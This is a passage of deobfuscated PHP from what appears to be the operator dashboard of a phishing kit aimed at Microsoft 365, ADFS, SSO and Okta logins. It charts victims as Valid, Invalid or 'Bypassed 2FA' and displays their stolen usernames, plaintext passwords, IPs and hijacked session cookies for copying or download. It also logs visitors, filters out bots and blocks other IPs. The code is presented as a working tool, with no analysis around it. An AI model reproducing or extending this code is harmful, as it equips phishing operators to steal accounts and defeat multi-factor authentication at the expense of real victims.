                            echo ";\r\n\t\t\t\t\tdocument.getElementsByClassName(\"visit-count\")[0].innerText = visit + bot;\r\n\t\t\t\t\tvar yValues = [visit, bot,];\r\n\t\t\t\t\tvar sum = yValues[0] + yValues[1];\r\n\t\t\t\t\tvar xValues = [`[\${yValues[0]}]  `+ \"Real Visits : \" + Number.parseFloat(sum > 0 ? (((yValues[0]/sum)) * 100) : 0).toFixed(2) + \"%\", `[\${yValues[1]}] ` + \" Bots: \" + Number.parseFloat(sum > 0 ? (((yValues[1]/sum)) * 100) : 0).toFixed(2) + \"%\",];\r\n\t\t\t\t\tvar barColors = [\r\n\t\t\t\t\t\t\"#00aba9\",\r\n\t\t\t\t\t\t\"#b91d47\",\r\n\t\t\t\t\t];\r\n\t\t\t\t\tsetTimeout(() => {\r\n\t\t\t\t\tnew Chart(\"myChart\", {\r\n\t\t\t\t\t\ttype: \"pie\",\r\n\t\t\t\t\t\tdata: {\r\n\t\t\t\t\t\t\tlabels: xValues,\r\n\t\t\t\t\t\t\tdatasets: [{\r\n\t\t\t\t\t\t\t\tbackgroundColor: barColors,\r\n\t\t\t\t\t\t\t\tdata: yValues\r\n\t\t\t\t\t\t\t}]\r\n\t\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\toptions: {\r\n\t\t\t\t\t\t\ttitle: {\r\n\t\t\t\t\t\t\t\tdisplay: true,\r\n\t\t\t\t\t\t\t\ttext: \"Visits By Ratio\"\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t});\r\n\t\t\t\t\t},{once:1});\r\n\t\t\t\t\t</script>\r\n\t\t\t\t</div>\r\n              </div>\r\n            </div>\r\n\t\t  \r\n\t\t\t<div class=\"col-lg-5 col-md-9\">\r\n              <div class=\"white-box analytics-info\">\r\n\t\t\t\t<div class=\"chart-holder-1 chart-holder\">\r\n\t\t\t\t\t<div id=\"countries-chart\" style=\"width:100%; max-width:600px; height:100%;\"></div>\r\n\t\t\t\t\t<script>\r\n\r\n\t\t\t\t\tgoogle.charts.load('current', {'packages':['corechart']});\r\ngoogle.charts.setOnLoadCallback(drawChart);\r\n\r\nfunction drawChart() {\r\n\r\n// Set Data\r\nconst data = google.visualization.arrayToDataTable([\r\n  ['Countries', 'Distribution'],\r\n  ";
                            $RD6Ps = array_sum($Vhu7c);
                            foreach ($iM6bM as $h9wx3 => $xRR65) {
                                echo sprintf(
                                    "['%s',%s],",
                                    $xRR65,
                                    round(($Vhu7c[$h9wx3] / $RD6Ps) * 360, 2)
                                );
                            }
                            echo "]);\r\n\r\n// Set Options\r\nconst options = {\r\n  title:'Visit Distribution',\r\n  is3D:true\r\n};\r\n\r\n// Draw\r\nconst chart = new google.visualization.PieChart(document.getElementById('countries-chart'));\r\nchart.draw(data, options);\r\n\r\n}\r\n\t\t\t\t\t</script>\r\n\t\t\t\t</div>\r\n                   ";
                            echo "              </div>\r\n            </div>\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n            <div class=\"col-lg-5 col-md-15\">\r\n              <div class=\"white-box analytics-info\">\r\n\t\t\t\t ";
                            class J2cFk
                            {
                                public $u5Ujn = 0;
                                public $gfKHT = 0;
                                public $QaTaU = 0;
                                public $hpWow = 0;
                                public $lMHL5 = 0;
                            }
                            class p1uT0
                            {
                                public $MnlsI = 0;
                                public $cbh2q = 0;
                                public $HCI7B = 0;
                                public $t1PY4 = 0;
                            }
                            if (file_exists("logs.json") == true) {
                                $ZtvXA = array_filter(
                                    explode(PHP_EOL, sZ8B6("logs.json"))
                                );
                                $wzhpQ = new p1uT0();
                                $r7pR1 = new j2cfk();
                                foreach ($ZtvXA as $RKG_v => $VfdN6) {
                                    $XE4iv = @json_decode(
                                        @base64_decode($VfdN6),
                                        1
                                    )["type"];
                                    $YoNZh = @json_decode(
                                        @base64_decode($VfdN6),
                                        1
                                    )["method"];
                                    switch ($XE4iv) {
                                        case 0:
                                            $wzhpQ->cbh2q++;
                                            goto UC6qI;
                                        case 1:
                                            $wzhpQ->MnlsI++;
                                            goto UC6qI;
                                        case 2:
                                            $wzhpQ->HCI7B++;
                                            goto UC6qI;
                                        case 3:
                                            $wzhpQ->HCI7B++;
                                            goto UC6qI;
                                        default:
                                            $wzhpQ->t1PY4++;
                                    }
                                    UC6qI:
                                    if (stripos($YoNZh, "normal") !== false) {
                                        $r7pR1->hpWow++;
                                        goto G4CPF;
                                    }
                                    if (stripos($YoNZh, "sso.") !== false) {
                                        $r7pR1->gfKHT++;
                                        goto fIrrH;
                                    }
                                    if (stripos($YoNZh, "okta.") !== false) {
                                        $r7pR1->QaTaU++;
                                        goto GH_qS;
                                    }
                                    if (stripos($YoNZh, "adfs.") !== false) {
                                        $r7pR1->u5Ujn++;
                                        goto XKTPo;
                                    }
                                    $r7pR1->lMHL5++;
                                    XKTPo:
                                    GH_qS:
                                    fIrrH:
                                    G4CPF:
                                }
                                goto SFlr3;
                            }
                            $wzhpQ = new p1uT0();
                            $r7pR1 = new J2cFK();
                            SFlr3:
                            echo "                <h3 class=\"box-title\">Total Results [";
                            echo isset($ZtvXA) ? count($ZtvXA) : 0;
                            echo "]</h3>\r\n\t\t\t\t<div class=\"chart-holder-1 chart-holder\">\r\n\t\t\t\t\t<canvas id=\"rzchart\" style=\"width:100%;max-width:800px\"></canvas>\r\n\t\t\t\t\t\r\n\t\t\t\t\t<script>\r\n\t\t\t\t\tfunction sum_func(...args){\r\n\t\t\t\t\t\tsum = 0;\r\n\t\t\t\t\t\targs.map((x) => {\r\n\t\t\t\t\t\t\tsum += x;\r\n\t\t\t\t\t\t})\r\n\t\t\t\t\t\treturn sum;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tfunction addToArray(title){\r\n\t\t\t\t\t\treturn `[\${this.y[this.index]}]  `+ title+\" : \" + Number.parseFloat(this.sum > 0 ? (((this.y[this.index]/this.sum)) * 100) : 0).toFixed(2) + \"%\"\r\n\t\t\t\t\t}\r\n\t\t\t\t\tvar vl = ";
                            echo $wzhpQ->MnlsI;
                            echo ";\r\n\t\t\t\t\tvar ivl = ";
                            echo $wzhpQ->cbh2q;
                            echo ";\r\n\t\t\t\t\tvar _2fa = ";
                            echo $wzhpQ->HCI7B;
                            echo ";\r\n\t\t\t\t\tvar nValues = [vl, ivl, _2fa];\r\n\t\t\t\t\tvar sum = sum_func.apply(null,nValues);\r\n\t\t\t\t\tvar x2Values = [addToArray.call({y:nValues,sum:sum,index:0},\"Valid\"), addToArray.call({y:nValues,sum:sum,index:1},\"InValid\"),addToArray.call({y:nValues,sum:sum,index:2},\"2FA\")];\r\n\t\t\t\t\tvar bar2Colors = [\r\n\t\t\t\t\t\t\"#1b1ede\",\r\n\t\t\t\t\t\t\"#f50f0f\",\r\n\t\t\t\t\t\t\"#732626\"\r\n\t\t\t\t\t];\r\n\r\n\t\t\t\t\tf = new Chart(\"rzchart\", {\r\n\t\t\t\t\t\ttype: \"pie\",\r\n\t\t\t\t\t\tdata: {\r\n\t\t\t\t\t\t\tlabels: x2Values,\r\n\t\t\t\t\t\t\tdatasets: [{\r\n\t\t\t\t\t\t\t\tbackgroundColor: bar2Colors,\r\n\t\t\t\t\t\t\t\tdata: nValues\r\n\t\t\t\t\t\t\t}]\r\n\t\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\toptions: {\r\n\t\t\t\t\t\t\ttitle: {\r\n\t\t\t\t\t\t\t\tdisplay: true,\r\n\t\t\t\t\t\t\t\ttext: \"Results By Ratio\",\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t});\r\n\t\t\t\t\t</script>\r\n\t\t\t\t</div>\r\n              </div>\r\n            </div>\r\n\t\t\t<div class=\"col-lg-5 col-md-9\">\r\n              <div class=\"white-box analytics-info\">\r\n\t\t\t\t<div class=\"chart-holder-1 chart-holder\">\r\n\t\t\t\t\t<div id=\"type-chart\" style=\"width:100%; max-width:600px; height:100%;\"></div>\r\n\t\t\t\t\t<script>\r\n\r\n\t\t\t\t\tgoogle.charts.load('current', {'packages':['corechart']});\r\ngoogle.charts.setOnLoadCallback(drawChart);\r\n\r\nfunction drawChart() {\r\n\r\n// Set Data\r\n";
                            $a20_U =
                                $r7pR1->u5Ujn +
                                $r7pR1->gfKHT +
                                $r7pR1->hpWow +
                                $r7pR1->lMHL5 +
                                $r7pR1->QaTaU;
                            echo "const data = google.visualization.arrayToDataTable([\r\n  ['Type', 'VariaTion'],\r\n  ['Office',";
                            echo $a20_U > 0
                                ? round(($r7pR1->hpWow / $a20_U) * 360, 3)
                                : 0;
                            echo "],\r\n  [\"Adfs\",";
                            echo $a20_U > 0
                                ? round(($r7pR1->u5Ujn / $a20_U) * 360, 3)
                                : 0;
                            echo "],\r\n  [\"Sso\",";
                            echo $a20_U > 0
                                ? round(($r7pR1->gfKHT / $a20_U) * 360, 3)
                                : 0;
                            echo "],\r\n  [\"Okta\",";
                            echo $a20_U > 0
                                ? round(($r7pR1->QaTaU / $a20_U) * 360, 3)
                                : 0;
                            echo "],\r\n  [\"Others\",";
                            echo $a20_U > 0
                                ? round(($r7pR1->lMHL5 / $a20_U) * 360, 3)
                                : 0;
                            echo "],\r\n]);\r\n\r\n// Set Options\r\nconst options = {\r\n  title:'Results Distribution',\r\n  is3D:true\r\n};\r\n\r\n// Draw\r\nconst chart = new google.visualization.PieChart(document.getElementById('type-chart'));\r\nchart.draw(data, options);\r\n\r\n}\r\n\t\t\t\t\t</script>\r\n\t\t\t\t</div>\r\n                   ";
                            echo "              </div>\r\n            </div>\r\n           \r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- PRODUCTS YEARLY SALES -->\r\n          <!-- ============================================================== -->\r\n\t\t  <div class=\"row\">\r\n            <div class=\"col-md-12 col-lg-12 col-sm-12 col-xs-12\">\r\n              <div class=\"white-box overflow-auto\">\r\n                <h3 class=\"box-title\">Errors</h3>\r\n               \r\n                <div id=\"ctx-visits\" style=\"max-height: 200px;\">\r\n\t\t\t\t\t<table class=\"d-tab\">\r\n\t\t\t\t\t<tbody>\r\n\t\t\t\t   ";
                            if (file_exists("error.log")) {
                                $TF9Tn = file_get_contents("error.log");
                                if ($TF9Tn) {
                                    $k0YFq = explode(PHP_EOL, $TF9Tn);
                                    foreach ($k0YFq as $rdCIj) {
                                        if (!$rdCIj) {
                                            goto tKIX8;
                                        }
                                        $rdCIj = htmlspecialchars($rdCIj);
                                        echo "<tr><p>{$rdCIj}</p></tr>";
                                        tKIX8:
                                    }
                                    goto ltTfL;
                                }
                                echo "No Errors";
                                ltTfL:
                                goto wZpHF;
                            }
                            echo "No Errors";
                            wZpHF:
                            echo "\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n                </div>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <div class=\"row\">\r\n            <div class=\"col-md-12 col-lg-12 col-sm-12 col-xs-12\">\r\n              <div class=\"white-box overflow-auto\">\r\n                <h3 class=\"box-title\">Results</h3>\r\n                <div class=\"d-md-flex\">\r\n                  <ul class=\"list-inline d-flex ms-auto\">\r\n\t\t\t\t   <form role=\"search\" class=\"app-search d-none d-md-block me-3\">\r\n                  <input\r\n                    type=\"text\"\r\n                    placeholder=\"Search...\"\r\n                    class=\"form-control mt-0 live-search\"\r\n                  />\r\n                </form>\r\n\t\t\t\t  </ul>\r\n                </div>\r\n                <div class=\"modal\" id=\"exampleModalCenter\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalCenterTitle\" aria-hidden=\"true\">\r\n                  <div class=\"modal-dialog modal-dialog-centered\" role=\"document\">\r\n                    <div class=\"modal-content\">\r\n                      <div class=\"modal-header\">\r\n                        <h5 class=\"modal-title\" id=\"exampleModalLongTitle\">{header}</h5>\r\n                        <button type=\"button\" class=\"btn btn-secondary close-modal\" data-dismiss=\"modal\" aria-label=\"Close\">\r\n                          <span aria-hidden=\"true\">\xc3\x97</span>\r\n                        </button>\r\n                      </div>\r\n                      <div style=\"height: 10rem; max-height: 16rem;\" class=\"modal-body overflow-auto\">\r\n                        {content}\r\n                      </div>\r\n                      <div class=\"modal-footer\">\r\n                        <input type=\"hidden\" class=\"d-def\"></input>\r\n                        <button type=\"button\" class=\"btn btn-secondary close-modal\" data-dismiss=\"modal\">Close</button>\r\n                        <button type=\"button\" class=\"btn btn-primary download\">Download <i class=\"fa fa-download\"></i></button>\r\n                        <button type=\"button\" class=\"btn btn-primary copy\">Copy <i class=\"fa fa-clipboard\"></i></button>\r\n                      </div>\r\n                    </div>\r\n                  </div>\r\n                </div>\r\n                <div id=\"ctx-visits\" style=\"max-height: 405px;\">\r\n                 \r\n                 <table class=\"d-tab\">\r\n\t\t\t\t\t<tbody>\r\n                   ";
                            if (file_exists("logs.json")) {
                                function oFINy($xljHe)
                                {
                                    $b_wC1 = explode(
                                        PHP_EOL,
                                        file_get_contents("log.json")
                                    );
                                    foreach ($b_wC1 as $nzgNb => $XWc1p) {
                                        if ($XWc1p) {
                                            $vbuRQ = json_decode($XWc1p, 1);
                                            $fXx18 = $vbuRQ["ip"];
                                            if (!($fXx18 == $xljHe)) {
                                                goto vP6Sh;
                                            }
                                            return $vbuRQ["country"];
                                        }
                                        vP6Sh:
                                    }
                                }
                                $et41F = function ($jn1lh) {
                                    goto w5WyL;
                                    HJ2NC:
                                    $t0lGH = strlen($psWrM);
                                    goto tmz9Z;
                                    AyXFL:
                                    $goouY = [
                                        "type" => "cookie_for_" . $eZG8y,
                                        "val" => sprintf(
                                            "%s",
                                            $VJBr_ >= 2
                                                ? "" . $jn1lh["cook"]
                                                : ""
                                        ),
                                        "head" =>
                                            $r7pR1 .
                                            " Cookie for " .
                                            $eZG8y .
                                            " on " .
                                            $jn1lh["date"],
                                    ];
                                    goto GbWgu;
                                    lvfdO:
                                    $eZG8y = $jn1lh["ip"];
                                    goto tZYvv;
                                    P9s7m:
                                    Uehp_:
                                    goto zwvyY;
                                    AmIt8:
                                    switch ($VJBr_) {
                                        case 0:
                                            $r7pR1 = "Invalid";
                                            goto Uehp_;
                                        case 1:
                                            $r7pR1 = "Valid";
                                            goto Uehp_;
                                        case 2:
                                            $r7pR1 = "Bypassed 2FA";
                                            goto Uehp_;
                                        case 3:
                                            $r7pR1 = "Bypassed 2FA";
                                            goto Uehp_;
                                        default:
                                            $r7pR1 = "Un";
                                            goto Uehp_;
                                    }
                                    goto pYHzX;
                                    WSV2A:
                                    $jn1lh = $or_Wm = json_decode($jn1lh, 1);
                                    goto lzbWB;
                                    pYHzX:
                                    xzkEA:
                                    goto P9s7m;
                                    PFmMT:
                                    echo $hmKHK;
                                    goto TNopb;
                                    N3GXx:
                                    $psWrM = substr($psWrM, $t0lGH - --$LQAnU);
                                    goto CIHZK;
                                    YR56t:
                                    cjEo_:
                                    goto WSV2A;
                                    lzbWB:
                                    $VJBr_ = $or_Wm["type"];
                                    goto AmIt8;
                                    zwvyY:
                                    $psWrM = explode(
                                        ".",
                                        explode("@", $jn1lh["user"])[1]
                                    )[0];
                                    goto HJ2NC;
                                    KohfW:
                                    return;
                                    goto YR56t;
                                    GbWgu:
                                    $hmKHK = sprintf(
                                        "<tr class=\"full-width-tr\"><td class=\"full-width-td\"><div class=\"row\"><div class=\"col\">\r\n                      <div class=\"card shadow\">\r\n                        <h5 class=\"card-header\">%s Log</h5>\r\n                        <div class=\"card-body\">\r\n                          <div class=\"card-title row\"><div class=\"col-2\"><h5>%s</h5></div> <div class=\"col\" ><div style=\"text-align:center; background-color: rgb(181, 188, 219,0.5); max-width: 180px;\";><h5>%s</h5></div></div> </div>\r\n                          <div class=\"card-text position-relative row\">\r\n                            <div class=\"col-6 mx-4 hidden-em\">\r\n                              %s\r\n                            </div>\r\n                            <div class=\"col-2\">\r\n                              <button class=\"btn btn-primary show-log\" value='%s'>\r\n                                Details\r\n                                <i class=\"fa fa-eye\"></i>\r\n                              </button>\r\n                            </div>\r\n                            <div class=\"col-3\">\r\n                              <button class=\"btn btn-primary show-cook\" value='%s' %s>\r\n                                Cookies\r\n                                <i class=\"fa fa-eye\"></i>\r\n                              </button>\r\n                            </div>\r\n                          </div>\r\n                        </div>\r\n                      </div>\r\n\t\t\t\t\t   </div></div</td></tr>",
                                        $r7pR1,
                                        $eZG8y,
                                        OFinY($eZG8y),
                                        $qJgv4,
                                        json_encode($yApBE),
                                        $VJBr_ >= 2 ? json_encode($goouY) : "",
                                        $VJBr_ < 2 ? "disabled" : ""
                                    );
                                    goto PFmMT;
                                    w5WyL:
                                    if ($jn1lh) {
                                        goto cjEo_;
                                    }
                                    goto KohfW;
                                    p_uEr:
                                    $yApBE = [
                                        "type" => "log_for_" . $eZG8y,
                                        "val" => base64_encode(
                                            sprintf(
                                                "========%s Log ========<br>   Username  =  %s<br>  Password  =  %s<br>  IP = %s   %s <br>============Greatness============\r\n\t\t\t\t\t\t\t",
                                                $r7pR1,
                                                htmlspecialchars(
                                                    $jn1lh["user"]
                                                ),
                                                htmlspecialchars(
                                                    $jn1lh["pass"]
                                                ),
                                                $eZG8y,
                                                $VJBr_ == 0
                                                    ? "<br>Type  =  " .
                                                        $jn1lh["method"]
                                                    : ""
                                            )
                                        ),
                                        "head" =>
                                            $r7pR1 .
                                            " Log for " .
                                            $eZG8y .
                                            " on " .
                                            $jn1lh["date"],
                                    ];
                                    goto AyXFL;
                                    tZYvv:
                                    $Gq50P = RwOQd();
                                    goto p_uEr;
                                    tmz9Z:
                                    $LQAnU = round(0.9 * $t0lGH);
                                    goto N3GXx;
                                    CIHZK:
                                    $qJgv4 = preg_replace(
                                        "/" . $psWrM . "/",
                                        str_repeat("*", strlen($psWrM)),
                                        $jn1lh["user"]
                                    );
                                    goto lvfdO;
                                    TNopb:
                                };
                                foreach (
                                    array_reverse($ZtvXA)
                                    as $wgAfN => $JsFl8
                                ) {
                                    $et41F(base64_decode($JsFl8));
                                }
                                goto fA1yo;
                            }
                            echo "Nothing Yet";
                            fA1yo:
                            echo "\t\t\t\t   \r\n\r\n                 \r\n\r\n                  \r\n\r\n\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n                </div>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- RECENT SALES -->\r\n          <!-- ============================================================== -->\r\n          <div class=\"row\">\r\n            <div class=\"col-md-12 col-lg-12 col-sm-12\">\r\n              <div class=\"white-box overflow-auto\" style=\"max-height: 30rem;\">\r\n                <div class=\"d-md-flex mb-3\">\r\n                  <h3 class=\"box-title mb-0\">Recent Visit</h3>\r\n                  <div class=\"col-md-3 col-sm-4 col-xs-6 ms-auto\">\r\n                  </div>\r\n                </div>\r\n                <div class=\"table-responsive\">\r\n                  <table class=\"table no-wrap\">\r\n                    <thead>\r\n                      <tr>\r\n                        <th class=\"border-top-0\">#</th>\r\n                        <th class=\"border-top-0\">IP</th>\r\n                        <th class=\"border-top-0\">Status</th>\r\n                        <th class=\"border-top-0\">ISP</th>\r\n                        <th class=\"border-top-0\">Date</th>\r\n                        <th class=\"border-top-0\">City</th>\r\n                        <th class=\"border-top-0\">Country</th>\r\n                        <th class=\"border-top-0\">Bot Reason</th>\r\n                      </tr>\r\n                    </thead>\r\n                    <tbody>\r\n\t\t\t\t\t";
                            if (!file_exists("log.json")) {
                                goto m_1wt;
                            }
                            function Je6C7($lFUuV)
                            {
                                $wKwTk = 13;
                                return strlen($lFUuV) <= $wKwTk
                                    ? $lFUuV
                                    : substr($lFUuV, 0, $wKwTk) . "...";
                            }
                            function UuVtF($RKG_v, $jn1lh)
                            {
                                $kevIG = json_decode($jn1lh, 1);
                                printf(
                                    "\r\n                      <tr>\r\n                        <td>%s</td>\r\n                        <td class=\"txt-oflo\">%s</td>\r\n                        <td>%s</td>\r\n                        <td title=\"%s\" class=\"txt-oflo\">%s</td>\r\n                        <td title=\"%s\" class=\"txt-oflo\">%s</td>\r\n                        <td title=\"%s\" class=\"txt-oflo\"><span class=\"text-success\">%s</span></td>\r\n                        <td title=\"%s\" ><span class=\"text-success\">%s</span></td>\r\n                        <td title=\"%s\" ><span class=\"text-success\">%s</span></td>\r\n                      </tr>",
                                    $RKG_v,
                                    $kevIG["ip"],
                                    $kevIG["bot"] == 0 ? "Visitor" : "Bot",
                                    $kevIG["isp"],
                                    Je6c7($kevIG["isp"]),
                                    $kevIG["date"],
                                    JE6c7($kevIG["date"]),
                                    $kevIG["city"],
                                    Je6C7($kevIG["city"]),
                                    $kevIG["country"],
                                    jE6C7($kevIG["country"]),
                                    $kevIG["reason"] ?? "N/A",
                                    je6C7($kevIG["reason"] ?? "N/A")
                                );
                            }
                            $b_wC1 = explode(
                                PHP_EOL,
                                file_get_contents("log.json")
                            );
                            $b_wC1 = array_filter(
                                array_reverse($b_wC1),
                                "strlen"
                            );
                            foreach ($b_wC1 as $nzgNb => $XWc1p) {
                                $RDfIL = json_decode($XWc1p, 1)["bot"];
                                if (!($RDfIL == 0)) {
                                    goto MyAJl;
                                }
                                uuVTf(count($b_wC1) + 1 - $nzgNb, $XWc1p);
                                MyAJl:
                            }
                            m_1wt:
                            echo "                      \r\n                    </tbody>\r\n                  </table>\r\n                </div>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- Recent Comments -->\r\n          <!-- ============================================================== -->\r\n          \r\n        </div>\r\n        <!-- ============================================================== -->\r\n        <!-- End Container fluid  -->\r\n        <!-- ============================================================== -->\r\n        <!-- ============================================================== -->\r\n        <!-- footer -->\r\n        <!-- ============================================================== -->\r\n        <footer class=\"footer text-center\">\r\n          Greatness\r\n        </footer>\r\n        <!-- ============================================================== -->\r\n        <!-- End footer -->\r\n        <!-- ============================================================== -->\r\n      </div>\r\n      <!-- ============================================================== -->\r\n      <!-- End Page wrapper  -->\r\n      <!-- ============================================================== -->\r\n    </div>\r\n    <!-- ============================================================== -->\r\n    <!-- End Wrapper -->\r\n    <!-- ============================================================== -->\r\n    <!-- ============================================================== -->\r\n    <!-- All Jquery -->\r\n    <!-- ============================================================== -->\r\n\r\n    <script src=\"assets/jquery.min.js\"></script>\r\n    <!-- Bootstrap tether Core JavaScript -->\r\n    <script src=\"assets/bootstrap.bundle.min.js\"></script>\r\n    <script src=\"assets/app-style-switcher.js\"></script>\r\n    <script src=\"assets/jquery.sparkline.min.js\"></script>\r\n    <!--Wave Effects -->\r\n    <script src=\"assets/waves.js\"></script>\r\n    <!--Menu sidebar -->\r\n    <script src=\"assets/sidebarmenu.js\"></script>\r\n    <!--Custom JavaScript -->\r\n    <script src=\"js/custom.js\"></script>\r\n    <!--This page JavaScript -->\r\n    <!--chartis chart-->\r\n    <script src=\"assets/chartist.min.js\"></script>\r\n    <script src=\"assets/chartist-plugin-tooltip.min.js\"></script>\r\n    <script src=\"assets/dashboard1.js\"></script>\r\n  </body>\r\n</html>";
                            return;
                        }
                        echo "<h1>Ip Restriction come back later</h1>";
                        exit(0);
                    }
                    echo "<h1>Ip Restriction come back later</h1>";
                    exit(0);
                }
                echo "<h1>Ip Restriction come back later</h1>";
                exit(0);
            }
            exit();
        }
        echo "<h1>Ip Restriction come back later</h1>";
        exit(0);
    }
    unset($_SESSION["logged"]);
    header("Location: index.php");
    exit();
}
echo "<h1>Ip Restriction come back later</h1>";

// Decoded By t.me/S4Moel
exit(0);
